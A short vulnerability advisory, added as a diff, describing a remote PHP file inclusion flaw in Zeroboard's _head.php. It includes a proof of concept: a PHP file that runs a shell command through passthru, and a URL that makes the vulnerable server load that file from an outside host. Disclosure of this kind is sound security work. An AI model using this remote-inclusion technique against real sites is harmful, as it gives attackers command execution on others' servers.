@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/5028/info
+
+Zeroboard is a PHP web board package available for the Linux and Unix platforms.
+
+Under some circumstances, it may be possible to include arbitrary PHP files. The _head.php file does not sufficiently check or sanitize input. When the "allow_url_fopen" variable and the "register_globals" variable in php.ini are set to "On," it is possible to load a PHP include file from a remote URL via the _head.php script. 
+
+PHP Source file a.php
+<? passthru("/bin/ls"); ?>
+
+Accessing URL on vulnerable system:
+http://vulnerablesystem/_head.php?_zb_path=http://example.com/a
+
